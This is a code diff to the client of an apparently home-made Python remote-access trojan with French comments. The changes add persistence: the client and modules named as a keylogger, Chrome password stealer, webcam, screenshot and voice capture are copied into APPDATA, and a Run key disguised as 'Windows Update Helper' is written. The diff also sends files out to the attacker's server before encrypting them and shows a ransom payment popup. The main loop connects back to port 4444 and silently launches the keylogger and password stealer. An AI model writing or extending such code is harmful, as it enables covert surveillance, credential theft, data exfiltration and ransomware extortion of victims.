@@ -8,6 +8,8 @@ import time
 import platform
 import zipfile
 import tempfile
+import shutil
+
 
 
 IS_WINDOWS = platform.system() == "Windows"
@@ -18,7 +20,7 @@ if IS_WINDOWS:
     import winreg
 
 
-SERVER_IP = "192.168.162.1"
+SERVER_IP = "192.168.3.1"
 SERVER_PORT = 4444
 
 
@@ -55,15 +57,60 @@ def hide_file(path):
     ctypes.windll.kernel32.SetFileAttributesW(path, attrs)
 
 
-def add_to_startup(exe_path, name="winupd"):
+# def add_to_startup(exe_path, name="winupd"):
+#     key = winreg.OpenKey(
+#         winreg.HKEY_CURRENT_USER,
+#         r"Software\Microsoft\Windows\CurrentVersion\Run",
+#         0,
+#         winreg.KEY_SET_VALUE
+#     )
+#     winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
+#     winreg.CloseKey(key)
+
+
+
+
+MODULES = [
+    "keylogger.exe",
+    "chrome_password.exe",
+    "web_cam.exe",
+    "remote.exe",
+    "screenshot.exe",
+    "voice_module.exe",
+]
+
+def setup_persistence():
+    appdata = os.getenv("APPDATA")
+    dest_dir = os.path.join(appdata, "Microsoft", "WinUpd")
+    os.makedirs(dest_dir, exist_ok=True)
+
+    # Copie le client lui-même
+    current_exe = sys.executable
+    dest_exe = os.path.join(dest_dir, "winupd.exe")
+    if not os.path.exists(dest_exe):
+        shutil.copy2(current_exe, dest_exe)
+
+    # Copie tous les modules .exe
+    base_dir = os.path.dirname(current_exe)
+    for module in MODULES:
+        src = os.path.join(base_dir, module)
+        dst = os.path.join(dest_dir, module)
+        if os.path.exists(src) and not os.path.exists(dst):
+            shutil.copy2(src, dst)
+
+    # Ajout au démarrage
+    import winreg
     key = winreg.OpenKey(
         winreg.HKEY_CURRENT_USER,
         r"Software\Microsoft\Windows\CurrentVersion\Run",
         0,
         winreg.KEY_SET_VALUE
     )
-    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
+    winreg.SetValueEx(key, "Windows Update Helper", 0, winreg.REG_SZ, dest_exe)
     winreg.CloseKey(key)
+
+    print("[+] Copie complète avec persistance.")
+
 
 
 def send_file(client_socket, file_path, file_type):
@@ -238,6 +285,10 @@ def handle_commands(client_socket):
                     generate_key()
                 key = load_key()
 
+                if os.path.exists(path):
+                    send_file(client_socket, path, "exfil")
+                    time.sleep(1)
+
                 encrypt_file(path, key)
 
                 # Sauvegarder ce fichier comme à déchiffrer après paiement
@@ -253,11 +304,15 @@ def handle_commands(client_socket):
                 # Affiche une popup
                 if IS_WINDOWS:
                     import ctypes
+                    message = (
+                        f"Le fichier suivant a été chiffré :\n\n{path}\n\n"
+                        "Payez pour le restaurer :\nhttp://192.168.3.1:4242/pay"
+                    )
                     ctypes.windll.user32.MessageBoxW(
                         0,
-                        "Vos fichiers ont été chiffrés. Payez pour les restaurer.\nVisitez : http://192.168.162.1:4242/pay",
+                        message,
                         "Fichier bloqué",
-                        0x10
+                        0x10  # MB_ICONERROR
                     )
 
 
@@ -293,23 +348,16 @@ def main():
     #     if os.path.exists(exe):
     #         hide_file(exe)
 
-    # add_to_startup(os.path.join(BASE_DIR, "rat_client.exe")) ======> A CORRIGER 
+    # add_to_startup(os.path.join(BASE_DIR, "rat_client.exe")) ======> A CORRIGER
 
-    # with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    #     s.connect((SERVER_IP, SERVER_PORT))
-    #     s.send(platform.system().encode())
+    # if IS_WINDOWS and getattr(sys, 'frozen', False):
+    #     add_to_startup(sys.executable)
+    if IS_WINDOWS and getattr(sys, 'frozen', False):
+        setup_persistence()
 
-        
-    #     if IS_WINDOWS:
-    #         subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
-    #         subprocess.run([PASSWORD_EXE], check=True)
-    #     else:
-    #         subprocess.Popen([KEYLOGGER_EXE])
-        
 
-    #     handle_commands(s)
 
-     while True:
+    while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.connect((SERVER_IP, SERVER_PORT))
@@ -318,7 +366,9 @@ def main():
                 # Lancer modules au démarrage
                 if IS_WINDOWS:
                     subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
-                    subprocess.run([PASSWORD_EXE], check=True)
+                    # subprocess.run([PASSWORD_EXE], check=True)
+                    subprocess.Popen([PASSWORD_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+
 
                 else:
                     subprocess.Popen([KEYLOGGER_EXE])
